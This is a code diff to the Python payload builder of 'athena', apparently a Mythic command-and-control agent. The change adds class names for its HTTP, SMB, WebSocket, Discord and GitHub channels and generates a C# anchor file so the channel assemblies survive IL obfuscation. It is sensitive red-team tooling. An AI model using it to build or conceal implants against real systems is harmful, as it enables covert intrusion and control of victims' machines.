@@ -150,12 +150,13 @@ class athena(PayloadType):
     ]
     c2_profiles = ["http", "websocket", "slack", "smb", "discord", "github"]
 
+    # (dir_name, config_file, assembly_for_roots, channel_class)
     PROFILE_REGISTRY = {
-        "http":      ("Workflow.Channels.Http",      "HttpProfile.cs",      "Workflow.Channels.HTTP"),
-        "smb":       ("Workflow.Channels.Smb",       "SmbProfile.cs",       "Workflow.Channels.SMB"),
-        "websocket": ("Workflow.Channels.Websocket",  "WebsocketProfile.cs", "Workflow.Channels.Websocket"),
-        "discord":   ("Workflow.Channels.Discord",    "DiscordProfile.cs",   "Workflow.Channels.Discord"),
-        "github":    ("Workflow.Channels.GitHub",     "GitHubProfile.cs",    "Workflow.Channels.GitHub"),
+        "http":      ("Workflow.Channels.Http",      "HttpProfile.cs",      "Workflow.Channels.HTTP",    "HttpProfile"),
+        "smb":       ("Workflow.Channels.Smb",       "SmbProfile.cs",       "Workflow.Channels.SMB",     "SmbProfile"),
+        "websocket": ("Workflow.Channels.Websocket",  "WebsocketProfile.cs", "Workflow.Channels.Websocket","Websocket"),
+        "discord":   ("Workflow.Channels.Discord",    "DiscordProfile.cs",   "Workflow.Channels.Discord", "DiscordProfile"),
+        "github":    ("Workflow.Channels.GitHub",     "GitHubProfile.cs",    "Workflow.Channels.GitHub",  "GitHub"),
     }
 
     async def prepareWinExe(self, output_path):
@@ -167,7 +168,7 @@ class athena(PayloadType):
         os.rename(os.path.join(output_path, "Agent_Headless.exe"), os.path.join(output_path, "Athena.exe"))
 
     def buildProfile(self, gen_dir, c2, profile_name):
-        dir_name, _, assembly = self.PROFILE_REGISTRY[profile_name]
+        dir_name, _, assembly, _cls = self.PROFILE_REGISTRY[profile_name]
 
         # Collect parameters into a flat dict
         config = {}
@@ -282,8 +283,39 @@ class athena(PayloadType):
         with open(config_path, "w") as f:
             f.write(cs_source)
 
-    def writeBuildTargets(self, gen_dir, references, profile_dirs):
+    def writeChannelAnchor(self, gen_dir, profile_classes):
+        """Generate a C# file that creates direct PE references to channel types.
+
+        Without this, channel assemblies are ProjectReferences but have no
+        code-level type usage in ServiceHost, so they don't appear in
+        Assembly.GetReferencedAssemblies(). Adding a typeof() reference forces
+        the compiler to emit an AssemblyRef, which survives IL obfuscation
+        (the obfuscator patches both the ref and the definition consistently).
+        """
+        type_list = ", ".join(
+            "typeof({}.{})".format(ns, cls)
+            for ns, cls in profile_classes
+        )
+        cs_source = (
+            "// Auto-generated: forces PE-level assembly reference to channel(s)\n"
+            "namespace Workflow.Config\n"
+            "{{\n"
+            "    internal static class _ChannelRef\n"
+            "    {{\n"
+            "        internal static System.Type[] _Get() =>\n"
+            "            new System.Type[] {{ {} }};\n"
+            "    }}\n"
+            "}}\n"
+        ).format(type_list)
+        anchor_path = os.path.join(gen_dir, "ChannelAnchor.g.cs")
+        with open(anchor_path, "w") as f:
+            f.write(cs_source)
+        return anchor_path
+
+    def writeBuildTargets(self, gen_dir, references, profile_dirs, profile_classes):
         """Generate an MSBuild .targets file with references and compile includes."""
+        anchor_path = self.writeChannelAnchor(gen_dir, profile_classes)
+
         lines = ['<Project>']
 
         # ServiceHost: project references, config include, trimmer roots
@@ -298,6 +330,11 @@ class athena(PayloadType):
         lines.append(
             '    <Compile Include="{}" Link="Config/ServiceConfigData.g.cs" />'.format(
                 os.path.join(gen_dir, "ServiceConfigData.g.cs")
+            )
+        )
+        lines.append(
+            '    <Compile Include="{}" Link="Config/ChannelAnchor.g.cs" />'.format(
+                anchor_path
             )
         )
         lines.append('    <TrimmerRootDescriptor Remove="Roots.xml" />')
@@ -449,17 +486,20 @@ class athena(PayloadType):
             roots_replace = ""
             all_references = []
             profile_dirs = []
+            # (fq_namespace, class_name) pairs — one per selected channel
+            profile_classes = []
 
             for c2 in self.c2info:
                 profile = c2.get_c2profile()
                 name = profile["name"]
                 if name not in self.PROFILE_REGISTRY:
                     raise Exception("Unsupported C2 profile type for Athena: {}".format(name))
-                dir_name, _, assembly = self.PROFILE_REGISTRY[name]
+                dir_name, _, assembly, chan_cls = self.PROFILE_REGISTRY[name]
                 roots_replace += '<assembly fullname="{}"/>'.format(assembly) + '\n'
                 self.buildProfile(gen_dir, c2, name)
                 profile_short = dir_name.split(".")[-1]
                 profile_dirs.append(profile_short)
+                profile_classes.append((dir_name, chan_cls))
                 all_references.append(
                     os.path.join("..", "Workflow.Channels.{}".format(profile_short),
                                  "Workflow.Channels.{}.csproj".format(profile_short))
@@ -533,7 +573,7 @@ class athena(PayloadType):
                     pass
 
             # Generate build.targets with references and compile includes
-            self.writeBuildTargets(gen_dir, all_references, profile_dirs)
+            self.writeBuildTargets(gen_dir, all_references, profile_dirs, profile_classes)
 
             await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                 PayloadUUID=self.uuid,
